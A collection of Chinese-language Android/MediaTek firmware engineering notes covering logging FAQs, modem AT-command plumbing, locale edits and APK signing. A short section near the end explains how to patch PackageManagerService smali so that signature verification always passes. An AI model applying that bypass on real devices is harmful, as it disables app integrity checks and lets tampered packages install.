Android Default就只支持IPSec，这个可以通过Settings中的VPN查看，不支持 TLS 和 SSHv2。

Android VPN支持以下几种协议：
PPTP
L2TP/IPSec PSK
L2TP/IPSec RSA
IPSec Xauth PSK
IPSec Xauth RSA
IPSec Hybrid PSK
```

## [log] MTKlog 常见问题汇总

```text
1) Quick Start
1 .深入了解Logging Tools
http://online.mediatek.com/_layouts/15/mol/topic/ext/Topic.aspx?mappingId=844fde79-3e58-4f1f-bba7-cf0be27cee45

2 .深入了解MTKLogger
http://online.mediatek.com/_layouts/15/mol/topic/ext/Topic.aspx?MappingId=4116ea3e-1d44-4f6c-a150-19c57118bd11

2) FAQ 系列
NEW- 1 FAQ19560 user版本开启mtklog
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ19560

NEW- 2 FAQ20491 [Android O]  AEE 在android o上的变化 以及 提交log需要注意的问题
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ19560

3 .FAQ19362 如何设置mobilelog modemlog networklog size大小
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ19362

4 .FAQ15308 FactoryMode下用SD卡抓取mobilelog及modemlog
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ15308

5 .FAQ14184 Factory Mode下USB抓取modem log的方法
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ14184

6 .FAQ14339 MTK各boot up mode下 log的抓取方法
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ14339

7 .FAQ06944 Meta mode以及其他模式如何抓取mobilelog 
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ06944

8 .FAQ20071 KERN_DEBUG 等级log打印 & MTK Logd Filter Mechanism
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ20071

9 .FAQ15320 不同模式下如何保持uart log一直打开
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ15320

10.FAQ03891如何在User版本开启串口(Uart),抓取上层Log,开启输入控制台
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ03891

11 FAQ19689 kernel_log.boot从时间0s开始抓取(加大kernel log buffer)的修改方法
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ19689

12 FAQ20108 How to enable kernel dynamic debug log?
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ20108

13 FAQ20241 第一次开机加解密，开机解密过程中log 抓不到/丢失问题
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ20241

14 FAQ18335 Modem Exception提交eservice要提供哪些文件
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ18335

15 FAQ17814 如何设置MTKlogger是否开机自启动
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ17814

16 FAQ06939 如何用adb控制MTKLogger
http://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ06939
```

## [debug]  [FAQ20599]  单机高概率问题处理方法

```text
这里针对的是死机重启类问题
单机------是指出现问题的机器只有一两台
高概率-------是指这一两台问题机很容易出现死机重启
 
一旦机器符合"单机高概率" 这个特征都可以判定为硬件问题！
原因是：如果是软件问题，如此高的概率必然会导致其他机器大规模复现！！因为机器的软硬件环境都是一样的
 
对于单机高概率问题的处理流程：
1、回读pl lk bootimg systemimg与下载前的对比，看是否OK，如果不一样要么说明被用户刷机，要么说明emmc有问题------此时客户可以重刷来验证emmc是否损坏
 
2、如果步骤1 ok,请接下来做flash tool 的DDR test ,此步骤的目的是验证DDR是不是有明显的损坏
 
3、如果上面2个步骤都OK，其他器件的排查请贵司硬件先排查，然后在求助弊司硬件
```

## [AT]  [FAQ02918] 如何在java层直接下发at cmd

```text
目前AP端在PhoneBase.java中有方法invokeOemRilRequestStrings可以向modem透传AT，如果您想在modem 客制化自己的AT在ap端使用，可以用此方法；
Tips: 必须是run在phone进程中的代码才可以如此，第三方apk是不可以的。如果允许第3方apk调telephony中的接口向modem下AT命令的话，对于手机，这个安全隐患太大！

需要注意的地方：
（1）modem端的客制化需要最后return OK，否则RILD收到response后不会handle
（2）ap侧使用时需要定义长度为2的string数组；
<1>第一个成员存放需要下的AT string
<2>第二个成员存放这个AT的名字，用来处理modem上报response时区分的tag；他不会被下到modem侧
例如需要读IMEI，那么可以定义如下：

String imeiString = new String[2] ; //第一个string是你要下的AT command的完整string
imeiString[0]  = "AT+EGMR=0,7";
imeiString[1]  = "+EGMR";  //第二个string必须有，且名字是此AT名字，主要给rild用，不会下给modem；否则不会通过此channel返回上来

////////////详细的例子如下//////////////////////////////////////////////////////////////////////////////////////////
GPRS.java
onClick
String imeiString = new String[2] ; //第一个string是你要下的AT command的完整string
if(FeatureOption.MTK_GEMINI_SUPPORT){
    int simId = phone.getMySimId();
    if(simId == Phone.GEMINI_SIM_1){
        imeiString[0]  = "AT+EGMR=0,7";
    }else if(simId == Phone.GEMINI_SIM_2){
        imeiString[0]  = "AT+EGMR=0,10";
    }
}else{
    imeiString[0]  = "AT+EGMR=0,7";
}
imeiString[1]  = "+EGMR";  //第二个string必须有，且名字是此AT名字，主要给rild用，不会下给modem；否则不会通过此channel返回上来
Log.v(LOG_TAG, "IMEI String:" + imeiString[0] +imeiString[1] );
phone.invokeOemRilRequestStrings(imeiString, mResponseHander.obtainMessage(EVENT_READ_IMEI));

以上是common的处理，上述的phone对象如果获取的是卡1的GSMPhone对象，那么这个命令是发送给SIM1，同理，如果是卡2的GSMPhone对象，那么这个命令是发送给SIM2。

【KK版本及以前】
如果获取的是GeminiPhone对象，那么可以通过GeminiPhone中invokeOemRilRequestStringsGemini方法来发送，即public void invokeOemRilRequestStringsGemini(String[]  strings, Message response, int simid)。
卡1为PhoneConstants.GEMINI_SIM_1，卡2为PhoneConstants.GEMINI_SIM_2。

【L版本】
L版的C2K双卡项目上
1'当主卡为C2K卡时
要下AT至C2K Modem，可通过PhoneFactory.getDefaultPhone().getNLtePhone().invokeOemRilRequestStrings(,);方法实现；(其中getDefaultPhone()也可用getPhone(phoneId)来替换，下同)
要下AT至GSM Modem 4/3/2G protocol，可通过PhoneFactory.getDefaultPhone().getLtePhone().invokeOemRilRequestStrings(,);方法实现；
要下AT至GSM Modem 2G protocol，可通过
PhoneFactory.getPhone(phoneId).getLtePhone().invokeOemRilRequestStrings(,);方法实现；
2'当主卡为GSM卡时
要下AT至GSM Modem 4/3/2G protocol，可通过PhoneFactory.getDefaultPhone().getLtePhone().invokeOemRilRequestStrings(,);方法实现；
要下AT至C2K Modem，可通过PhoneFactory.getPhone(phoneId).getNLtePhone().invokeOemRilRequestStrings(,);方法实现；
要下AT至GSM Modem 2G protocol，可通过
PhoneFactory.getPhone(phoneId).getLtePhone().invokeOemRilRequestStrings(,);方法实现；
L版的非C2K的其他项目上，直接通过PhoneFactory.getPhone(phoneId).invokeOemRilRequestStrings(,);方法下AT命令至相应卡槽对应的Modem。

【M版本】
M0.MP1仍保持L版本的写法，其他M版本如下：
在之前的版本上，
ap侧使用时需要定义长度为2的string数组；
<1>第一个成员存放需要下的AT string
<2>第二个成员存放这个AT的名字，用来处理modem上报
在M上，因架构有所调整，如果要将AT命令发往C2K modem需在此添加第三个成员变量
<3>第三个成员存放这个AT希望发向哪个modem，DESTRILD:C2K指定发向C2K MD，DESTRILD:GSM指定发向GSM MD。
（第三个成员不设定的话，默认发向GSM MD）

【N版本】
参数<1> 和<2>处理与M上相同。
参数<3> 在 N1.MP16(MT6763) 版本 和 N1.MP18(MT6739) 版本 由于C2K和GSM在同一个modem，所以不用添加。其他版本与M上相同。

【O版本】
参数<1> 和<2>处理与M上相同。
参数<3> 在 搭配MT6763平台 和 MT6739平台的版本，由于C2K和GSM在同一个modem，所以不用添加。
```

## [AT]  [FAQ19648]  如何发送AT命令

```text
本FAQ说明三种情况下如何发送AT命令：
1. 在Phone进程发送AT命令
2. 在其他Java进程发送AT命令
3. 在Native进程发送AT命令

[SOLUTION] 

1.在Phone进程发送AT命令
参考 FAQ02918 [AT] 如何在java层直接下发at cmd

2.其他Java进程发送AT命令
> AT命令只需要发送给卡1：
调用TelephonyManager.invokeOemRilRequestRaw(byte[]  oemReq, byte[]  oemResp);

> AT命令需要发送给卡1/卡2：
Step 1:
/vendor/mediatek/proprietary/frameworks/base/telephony/java/com/mediatek/telephony/TelephonyManagerEx.java

//添加函数：add-start
public int invokeOemRilRequestRaw(byte[]  oemReq, byte[]  oemResp, int slotId){
    try {
        ITelephonyEx telephony = getITelephonyEx();
        if (telephony != null) {
            return telephony.invokeOemRilRequestRaw(oemReq, oemResp, slotId);
        }
    } catch (RemoteException ex) {
    } catch (NullPointerException ex) {
    }
    return -1;
}//add-end

Step 2:
frameworks/base/telephony/java/com/mediatek/internal/telephony/ITelephonyEx.aidl
添加接口：  int invokeOemRilRequestRaw(in byte[]  oemReq, out byte[]  oemResp, int slotId);

Step 3:
在/packages/services/Telephony/src/com/mediatek/phone/PhoneInterfaceManagerEx.java
//增加常量定义 add-start
private static final int CMD_INVOKE_OEM_RIL_REQUEST_RAW = **;
private static final int EVENT_INVOKE_OEM_RIL_REQUEST_RAW_DONE = **;
//add-end
//增加函数 add-start
public int invokeOemRilRequestRaw(byte[]  oemReq, byte[]  oemResp, int slotId) {
    enforceModifyPermission();
    int returnValue = 0;
        try {
            Phone phone=PhoneFactory.getPhone(slotId);
            AsyncResult result = (AsyncResult)sendRequest(CMD_INVOKE_OEM_RIL_REQUEST_RAW, phone, oemReq);
            if(result.exception == null) {
                if (result.result != null) {
                    byte[]  responseData = (byte[] )(result.result);
                    if(responseData.length > oemResp.length) {
                        Log.w(LOG_TAG, "Buffer to copy response too small: Response length is " +
                                responseData.length +  "bytes. Buffer Size is " +
                                oemResp.length + "bytes.");
                    }
                    System.arraycopy(responseData, 0, oemResp, 0, responseData.length);
                    returnValue = responseData.length;
                }
            } else {
                CommandException ex = (CommandException) result.exception;
                returnValue = ex.getCommandError().ordinal();
                if(returnValue > 0) returnValue *= -1;
            }
        } catch (RuntimeException e) {
            Log.w(LOG_TAG, "sendOemRilRequestRaw: Runtime Exception");
            returnValue = (CommandException.Error.GENERIC_FAILURE.ordinal());
            if(returnValue > 0) returnValue *= -1;
        }
        return returnValue;
    } //add-end

在MainThreadHandler.handleMessage()中添加：
// add-start
    case CMD_INVOKE_OEM_RIL_REQUEST_RAW:
        request = (MainThreadRequest)msg.obj;
        onCompleted = obtainMessage(EVENT_INVOKE_OEM_RIL_REQUEST_RAW_DONE, request);
        final Phone phone = (Phone) request.argument;
        phone.invokeOemRilRequestRaw((byte[] )request.argument2, onCompleted);
        break;
    case EVENT_INVOKE_OEM_RIL_REQUEST_RAW_DONE:
        ar = (AsyncResult)msg.obj;
        request = (MainThreadRequest)ar.userObj;
        request.result = ar;
        synchronized (request) {
            request.notifyAll();
        }
        break;
// add-end

Native进程发送AT命令
Step 1:
/vendor/mediatek/proprietary/hardware/ril/gsm/librilmtk/ril.cpp
static int handleSpecialRequestWithArgs(int argCount, char** args){
//在函数最后添加 add-start
else if (strcmp(cmd, "YOUR_CUSTOM_CMD_SEND_TO_RIL") == 0) { //YOUR_CUSTOM_CMD_SEND_TO_RIL修改为自定义名称
    memset(org_args, 0, sizeof(org_args));
    sprintf(org_args, "AT_COMMAND_YOU_WANT_TO_SEND"); //这里替换成为想要发送的AT命令
    int targetSim = 0;// 0发送给卡1,1发送给卡2
    issueLocalRequestForResponse(RIL_LOCAL_REQUEST_SEND_COMMAND, org_args, strlen(org_args), (RIL_SOCKET_ID)targetSim);
    close(s_fdOem_command);
    s_fdOem_command = -1;
    return 1;
} else {
    // invalid request
    LOGD("invalid request");
    goto error;
}

//在函数最后添加 add-end
Step 2:
//在需要发送AT命令的文件中添加下面代码，然后调用send_to_ril()
//add-start
#define YOUR_CUSTOM_SOCKET_NAME "rild-oem"
//add-end

//add-start
static int connect_socket() {
    int fd = socket_local_client(YOUR_CUSTOM_SOCKET_NAME, ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM);
    if (fd < 0) {
        //这里表示socket连接不成功，建议在这里处理。比如延迟1s再调用上面的函数连接socket，尝试几次。从log看，rild会比audio晚3s。
        //KLOG_ERROR(LOG_TAG, "Fail to connect to socket rild-ocm. return code: %d", fd);
        return -1;
    }
    return fd;
}

//cmd: YOUR_CUSTOM_CMD_SEND_TO_RIL 自定义命令
static int send_to_ril(char *cmd) {
    int ret = 0;
    int command_len = strlen(cmd);
    char *command = NULL;
    int fd = connect_socket();
    if (fd < 0) {
        ret = -1;
        goto error;
    }
    command_len = command_len + 1;
    command = (char *)malloc(sizeof(char) * command_len);
    memset(command, 0, sizeof(char) * command_len);
    strcpy(command,cmd)
    ret = send_data(fd, 1, command_len, command);

  error:
    if (command != NULL) {
        free(command);
    }
    if (fd >= 0) {
        disconnect_socket(fd);
    }
    return ret;
}

static int send_data(int fd, int arg_count, uint32_t data_length, const void *data) {
    int ret = 0;
    //(send-1)send argCount
    if(send(fd, (const void*)&arg_count, sizeof(int), 0) != sizeof(int)) {
        ret = -1;
        goto error;
    }
    //(send-2)send data length
    if(send(fd, (const void*)&data_length, sizeof(int), 0) != sizeof(int)) {
        ret = -1;
        goto error;
    }
    //KLOG_INFO(LOG_TAG, "(send-3). data: %s", (char *)data);
    if(send(fd, (const void*)data, data_length, 0) != (int)data_length) {
        ret = -1;
        goto error;
    }
   error:
    KLOG_INFO(LOG_TAG, "[send_data]  Ret:%d.", ret);
    return ret;
  }

int disconnect_socket(int fd) {
    if(fd < 0) {
        //KLOG_ERROR(LOG_TAG, "[disconnect_socket]  Invalid fd: %d", fd);
        return -1;
    }
    return close(fd);
}
//add-end
```

## [FAQ20503]  如何查找某个语言在Setting语言列表中是哪项

```text
举例说明：若需要找到语言列表下的孟加拉语，可以通过如下方式进行找到孟加拉语显示的字串是怎么样的?
（1）通过https://zh.wikipedia.org/wiki/ISO_639-1这个网站可以查到某个语言的language code，如要找孟加拉语，在这个网站上查到孟加拉语的language code是bn；
（2）进入 /external/icu/icu4c/source/data/lang/目录，根据要查看语言的language code，找到对应这个语言icu中字串的定义文件，如孟加拉语对应的文件bn.txt；
（3）打开这支文件查看languages下bn的定义，就是孟加拉语在settings中语言列表的显示；
（4）拖动Settings的语言列表即可查看到孟加拉语对应的名字，其他语言的查找方式类似。
```

## [log]  [FAQ20453]  flash tool抓取串口log

```text
flash tool下载或者做memory test时的一些log需要通过串口来打印，典型的是DDR模块相关的信息；但抓串口log常要飞uart 线，带来诸多不便

使用device.cfg.xml来让USB抓取串口log，不需要飞UART线。
device.cfg.xml放在flash tool目录的根目录，
文件内容如下：
<?xml version="1.0" encoding="utf-8"?>
<config>
    <!--log_level: trace, debug, info, warning, error, fatal -->
    <log_level>info</log_level>
    <!--log_channel: none, uart, usb, uart_usb -->
    <log_channel>usb</log_channel>
    <!--end_stage: 1stDA, 2ndDA-->
    <end_stage>2ndDA</end_stage>
</config>

说明：log_channel选择usb代表使用usb抓取串口log，抓到的串口log和flash tool原有的log在相同目录，C:\ProgramData\SP_FT_Logs\SP_FT_Dump_**-**-20**-**-**-**\DA_20******-******_0.log，选择uart代表需要硬件飞uart线抓取。
end_stage：1stDA代表是memory test时抓取，2ndDA代表是下载时抓取 
USB抓串口log相比飞线抓串口log会增加一点时间，1G大小的bin全擦下载大概多15S；
```

## [icu]  [FAQ20263]  设置中选择时区列表新增时区的显示如何随语言变化

```text
在Settings->Date & time->Select time zone中增加某个时区后，如何使这个时区的显示，跟随语言变化。如：在系统语言为英语时时区名字显示英语，为俄语时显示俄语，等等。
若需要切换到某个语言下，新增时区在这个语言下显示的字串变成当前语言，那么需要对这个语言下新增时区的字串定义进行修改，如，添加了新时区Europe/Astrakhan，但是当切换到俄语的时候这个时区的显示没有变成俄语，具体修改方法如下：
（1）找到俄语下时区信息的定义文件，/external/icu/icu4c/source/data/zone/ru.txt
（2）在ru.txt中的zoneStrings域中添加新增时区的定义

zoneStrings{
    "Europe:Astrakhan"{
        ec{"xxx"}  //xxx为这个时区在当前语言下需要显示的字串
    }
}
Europe:Astrakhan添加的位置需要按照字母顺序进行排序，所以需要添加在Europe:Athens之前。
（3）修改之后重新编译icu，并重新编译版本即可生效。
其他语言修改方式一样，找到这个语言/external/icu/icu4c/source/data/zone/下对应的xxx.txt文件，并添加新增时区的定义即可。
```

## [签名]  [FAQ05362]  如何采用第三方带密码的密钥进行APK签名

```text
修改build\tools\signapk\signapk.java，将其中函数 readPassword 中读取密码的code修改为从固定位置读取密码(比如从文件读取)，然后重新编译build\tools\signapk\，将生成的新的signapk.jar覆盖vendor\mediatek\[project] \artifacts\out\host\linux-x86\framework\signapk.jar，重新编译即可
 
PS：将该函数(readPassword)中try...catch语句删除，修改为从文件读取，或者直接return 贵司的密码即可
```

## TODO : [签名] 系统是如何校验apk签名和系统签名的？

## TODO : [签名] 可以给img重新签名吗？

## [签名] sharedUserID 的使用

```text
Android签名机制详细介绍 https://blog.csdn.net/jiangwei0910410003/article/details/50402000

Android提供了如下的一种机制，可以使两个apk打破前面讲的这种壁垒，只有相同签名和相同sharedUserID标签的两个应用程序签名才会被分配相同的用户ID。
在AndroidManifest.xml中利用sharedUserId属性给不同的package分配相同的userID，通过这样做，两个package可以被当做同一个程序，系统会分配给两个程序相同的UserID。当然，基于安全考虑，两个package需要有相同的签名，否则没有验证也就没有意义了。
如果增加了上面的属性但没有定义与之对应的LOCAL_CERTIFICATE（android.mk）的话，APK是安装不上去的。提示错误是：Package com.test.MyTest has no signatures that match those in shared user android.uid.system; ignoring!（也就是上面说的需要两个相同的签名），例如所有和media/download相关的APK都使用android.media作为sharedUserId的话，那么它们必须有相同的签名media。
关于签名： build/target/product/security目录中有四组默认签名供Android.mk在编译APK使用： 
1、testkey/releasekey：普通APK，默认情况下使用。
2、platform：该APK完成一些系统的核心功能。经过对系统中存在的文件夹的访问测试，这种方式编译出来的APK所在进程的UID为system。 
3、shared：该APK需要和home/contacts进程共享数据。 
4、media：该APK是media/download系统中的一环。 
应用程序的Android.mk中有一个LOCAL_CERTIFICATE字段，由它指定用哪个key签名，未指定的默认用testkey（但是当MTK_SIGNATURE_CUSTOMIZATION这个宏打开后，未指定的默认的会用releasekey，不懂看第五百四十六条即可）. 对于使用eclipse编译的apk，可以使用signapk.jar来手动进行签名
platform和shared对应签名文件的key都放在alps/build/target/product/security/common下，如platform.x509.pem、platform.pk8、shared.x509.pem、shared.pk8
签名工具signapk.jar位于/out/host/linux-x86/framework 下，由alps/build/tools/signapk/生成​。

ps：当打开MTK_SIGNATURE_CUSTOMIZATION这个宏时会直接使用device/mediatek/common/security/sr6580_we_n下面的key去进行签名，如果关闭MTK_SIGNATURE_CUSTOMIZATION这个宏时会直接使用MTK默认的key去签名，即build/target/product/security下面的，device/mediatek/common/security/sr6580_we_n下面的keyplatform.x509.pem、platform.pk8等这些是梁爽做出来的，同平台的应该都是一样的

使用方法：
1、以platform为例：
java -jar signapk.jar platform.x509.pem platform.pk8 input.apk output.apk (platform.x509.pem platform.pk8在build/target/product/security获取)
2、以shared为例：用 shared.x509.pem和shared.pk8来签名 Contacts.apk，重新签名之后的apk名字为Contacts_2.apk 
java -jar signapk.jar shared.x509.pem shared.pk8 Contacts.apk Contacts_2.apk 

ps：如果在AndroidManifest.xml和android.mk中都进行了修改，可以把该apk预置到手机中，这样在编译整个项目的时候会去编译这个apk，这样就会按照android.mk中的LOCAL_CERTIFICATE进行平台签名，如果不内置直接对apk进行签名，这时候就要用signapk.jar来手动进行签名，步骤在上面。

LOCAL_CERTIFICATE := PRESIGNED 表示这个apk已经签过名了，系统不需要再次签名；
build/target/product/security 目录中有四组默认签名可选: testkey, platform, shared, media (具体见README.txt)

关于apk的签名
1、第三方的apk用eclipse生成后可以直接install到手机中，我们如果不再eclipse里面特地的生成签名，那就默认会使用debug的签名；当然可以直接在生成apk的时候生成有自己个人信息的正式签名
2、第三方的apk用客户提供的keystore签名，会出现两种情况，如果该apk中没有使用shareduserid，那就可以直接install到手机上；如果该apk中使用了shareduserid（system）,这时候需要在keystore的基础上再进行平台签名，才能install到手机中
3、第三方的apk直接用平台签名可以直接install到手机中

SharedUserId 有哪几种??
常用的有
android.uid.system
android.uid.phone
android.uid.shared




[FAQ19857]  采用Signature Scheme v2签名方式的APK预置失败
Google在N上引入了一项新的应用签名方案Signature Scheme v2，它能提供更快的应用安装时间和更多针对APK文件更改的保护
在N上预置APK时，如果APK是采用的Signature Scheme v2签名，采用原有的预置应用方式预置APK会失败：

Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates fr
om /data/app/vmdl1483607312.tmp/base.apk: META-INF/CERT.SF indicates /data/app/v
mdl1483607312.tmp/base.apk is signed using APK Signature Scheme v2, but no such
signature was found. Signature stripped?] 

经过BUILD_PREBUILT后的apk与原apk是有差异的，因为v2是对apk整体签名，所以这个差异导致签名失效。
1、app预置到到工程中，用android.mk编译之后的APK是有区别的，android编译系统会用zipalign对APK进行字节对齐等操作
2、APK Signature Scheme v2这个是Google在N上新引入的签名方式。v2 签名将验证归档中每个文件的已压缩文件内容，如有任何自定义任务篡改 APK 文件或对其进行后处理（无论以任何方式），那么v2 签名会有作废的风险

在预置APK build进系统时候不让其走编译流程，在其他模块的 android.mk 加入下面的cp脚本：
$(shell cp $(LOCAL_PATH)/***/*.apk     $(TARGET_OUT)/vendor/operator/app)

APK能通过PMS扫描安装成功，可能还会报so找不到的问题，可以参考：
ID: FAQ19894  N上预置APK失败提示找不到so文件


如何知道APK是不是采用Signature Scheme v2签名?可参考：
FAQ20235 如何知道APK是不是采用Signature Scheme v2签名?

使用apksigner.jar工具的verify命令。这个工具位于SDK目录的build-tools目录下。打开cmd，把目录切到SDK\build-tools\版本号\lib下。
注：v2签名方式时在Android7.0后才推出的，所以只有版本>25的 SDK\build-tools\ 中才能找到apksigner.jar

java -jar /home/zq/Android/Sdk/build-tools/27.0.3/lib/apksigner.jar verify -v xxx.apk

Verifies
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): false
Number of signers

具体可以参考：https://developer.android.com/studio/command-line/apksigner.html#usage

Android 7.0 中引入了 APK Signature Scheme v2，v1 是 jar Signature 来自 JDK
V1：通过 ZIP 条目进行验证，这样 APK 签署后可进行许多修改 - 可以移动甚至重新压缩文件。
V2：验证压缩文件的所有字节，而不是单个 ZIP 条目，因此，在签名后无法再更改(包括 zipalign)。
所以 Signature Scheme v2 签名的 apk 经过编译系统重新编译打包后会导致系统解析时无
法获取到该 apk 的签名，从而安装失败。预置该类型 apk 时需要通过直接拷贝到指定位置
的方式，避免经过编译过程。
编译配置参考代码如下（直接拷贝不编译）：
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
$(shell mkdir -p $(TARGET_OUT)/preloadapp/Deliveryclub)
$(shell cp -r $(LOCAL_PATH)/Deliveryclub.apk $(TARGET_OUT)/preloadapp/Deliveryclub)
LOCAL_PACKAGE_NAME := Deliveryclub


[签名] Android V1,V2,V3签名
https://jeanboy.blog.csdn.net/article/details/97884257
https://jeanboy.blog.csdn.net/article/details/84849651
```

## [FAQ17553]  [签名] 如何手动对apk进行签名?

```text
如下情况会需要手动签名：
1.像Phone/Contacts/Dialer/SystemUI 等apk，在其package下面的Android.mk文件中，都有写明LOCAL_CERTIFICATE=platform或者shared的属性，测试过程中有时需做对比验证，但这些Android prebuilt apk是无法从一台手机里pull出来再直接push到手机运行的，需要用自己手机软件对应的key进行签名之后，才可以正常运行。
2.来自客户的demo apk或3rd apk带有platform或shared签名时，无法直接安装运行。
 
[SOLUTION] 
platform和shared对应签名文件的key都放在alps/build/target/product/security/common下，
签名工具signapk.jar位于/out/host/linux-x86/framework 下，由alps/build/tools/signapk/生成​。
 
使用方法：
1.明确待签名的apk所使用的签名类型
=>如果是Android prebuild apk，则直接查看package下面的Android.mk文件的LOCAL_CERTIFICATE栏位值是shared还是platform；
=>如果是来自客户的demo apk或3rd apk，则可直接向客户询问签名类型或者用Google提供的apktool反编译出apk的AndroidManifest.xml文件，查看其android:sharedUserId属性的值，是"android.uid.shared"(对应shared签名)还是"android.uid.system"(对应platform签名)
apktool链接：http://ibotpeaches.github.io/Apktool/
 
2.明确待签名的apk需要安装到的手机所对应Android软件版本，如Android 4.4或Android5.0等版本号，无需详细到手机软件具体的version版本号，只需大的Android软件版本号对应即可
 
3.参考上面签名文件和签名工具在android代码中的存放路径，将对应软件版本的签名文件和签名工具拷贝到PC或Linux系统某个目录下，与待签名的apk放在同一目录下
 
4.在待签名apk所在目录下执行签名命令java -jar signapk.jar  xxx xxx name.apk name_after_signatured.apk
其中xxx xxx分别是签名文件，name是apk的名字
 
使用方法举例：
例如：在Android5.0版本上，用platform.x509.pem和platform.pk8来签名​ Settings.apk，重新签名之后的apk名字为​Settings_1.apk​，那么将随意一份Android 5.0 软件代码中的signapk.jar和platform.x509.pem和platform.pk8等文件拷贝到PC，放在自己指定的路径下，如C盘或桌面，然后打开PC端cmd命令窗口或linux terminal窗口(确保你的环境有装java)，cd到该路径下，执行下面的命令：
java -jar signapk.jar platform.x509.pem platform.pk8 Contacts.apk Contacts_1.apk
 
例如：​用 shared.x509.pem和shared.pk8来签名 Contacts.apk，重新签名之后的apk名字为Contacts_2.apk 
java -jar signapk.jar shared.x509.pem shared.pk8 Contacts.apk Contacts_2.apk 
 
可以使用上述方法，对手头需要验证测试的系统apk做签名后，再push到手机就可以正常运行了。

java -jar out/host/linux-x86/framework/signapk.jar platform.x509.pem platform.pk8 test.apk test2.apk

展讯平台7.0系统签名需要多引用一个lib文件
java -Xmx2048m -Djava.library.path="out/host/linux-x86/lib64"     -jar out/host/linux-x86/framework/signapk.jar     -w build/target/product/security/platform.x509.pem     build/target/product/security/platform.pk8     vendor/sprd/partner/prebuilt_apps/TouchPal/TouchPal_5.8.4.4.20170405143955_Global_OEM.aligned.apk xx_sign.apk

展瑞Android R
java -Djava.library.path=out/soong/host/linux-x86/lib64 -jar out/soong/host/linux-x86/framework/signapk.jar -w build/make/target/product/security/release/releasekey.x509.pem build/make/target/product/security/release/releasekey.pk8 ~/ForRadioFrequency_Unsigned.apk ~/ForRadioFrequency_signed.apk
```

## [签名] 签名相关问题

```text
用命令行方式签名
使用标准的 java 工具 keytool 和 jarsigner 来生成证书和给程序签名
a) 生成签名文件
$ keytool -genkey -keystore keyfile -keyalg RSA -validity 10000 -alias yan
注:validity 为天数,keyfile 为生成 key 存放的文件,yan 为私钥,RSA 为指定的加密算法(可用 RSA 或 DSA)
b) 为 apk 文件签名
$ jarsigner -verbose -keystore keyfile -signedjar signed.apk base.apk yan
注:keyfile 为生成 key 存放的文件,signed.apk 为签名后的 apk,base.apk 为未签名的 apk,yan 为私钥
c) 看某个 apk 是否经过了签名
$ jarsigner -verify my_application.apk
d) 查看 apk 有效期等签名信息
$ jarsigner -verify -verbose -certs my_application.apk
e) 优化(签名后需要做对齐优化处理)
$ zipalign -v 4 your_project_name-unaligned.apk your_project_name.apk
3) 在源码中编译的签名
a) 使用源码中的默认签名
在源码中编译一般都使用默认签名的,在某源码目录中用运行
$ mm showcommands 能看到签名命令
Android 提供了签名的程序 signapk.jar,用法如下:
$ signapk publickey.x509[.pem]  privatekey.pk8 input.jar output.jar
*.x509.pem 为 x509 格式公钥,pk8 为私钥
b) 在源码中自签名
Android 提供了一个脚本 mkkey.sh(build/target/product/security/mkkey.sh),用于生成密钥, 生成后在应用程序中通过 Android.mk 中的 LOCAL_CERTIFICATE 字段指名用哪个签名
c) mkkey.sh 介绍
i) 生成公钥
openssl genrsa -3 -out testkey.pem 2048
其中-3 是算法的参数,2048 是密钥长度,testkey.pem 是输出的文件
ii) 转成x509 格式(含作者有效期等)
openssl req -new -x509 -key testkey.pem -out testkey.x509.pem -days 10000 -subj‘/C=US/ST=California/L=MountainView/O=Android/OU=Android/CN=AndroidemailAddress=android@android.com’
iii)
生成私钥
openssl pkcs8 -in testkey.pem -topk8 -outform DER -out testkey.pk8 -nocrypt
把的格式转换成 PKCS #8,这里指定了-nocryp,表示不加密,所以签名时
不用输入密码
4. 签名的相关文件
1) apk 包中签名相关的文件在 META_INF 目录下
CERT.SF:生成每个文件相对的密钥
MANIFEST.MF:数字签名信息
xxx.SF:这是 JAR 文件的签名文件,占位符 xxx 标识了签名者
xxx.DSA:对输出文件的签名和公钥
2) 相关源码
development/tools/jarutils/src/com.anroid.jarutils/SignedJarBuilder.java
frameworks/base/services/java/com/android/server/PackageManagerService.java
frameworks/base/core/java/android/content/pm/PackageManager.java
frameworks/base/cmds/pm/src/com/android/commands/pm/Pm.java
dalvik/libcore/security/src/main/java/java/security/Sign*
build/target/product/security/platform.*
build/tools/signapk/*
5. 签名的相关问题
一般在安装时提示出错:
INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES
1) 两个应用,名字相同,签名不同
2) 升级时前一版本签名,后一版本没签名
3) 升级时前一版本为 DEBUG 签名,后一个为自定义签名
4) 升级时前一版本为 Android 源码中的签名,后一个为 DEBUG 签名或自定义签名
5) 安装未签名的程序
6) 安装升级已过有效期的程序
6. 相关工具
1) 查看某个 x509 证书的的有效日期
在 SignApk.java 中打印出 publicKey.getNotAfter()即可
7. 参考
http://developer.android.com/guide/publishing/app-signing.html
http://www.pgcw.com.cn/Newsdetail.asp?id=257565010
http://www.eoeandroid.com/thread-23010-1-1.html
http://pepa.javaeye.com/blog/250991
```

## [签名] 破解android签名验证

```text
services.jar

PackageManagerService.smali

修改方法:
verifySignaturesLP 返回 1

修改方法:
compareSignatures 返回 0
```

## [签名] Android 系统签名实现的三种方式

```text
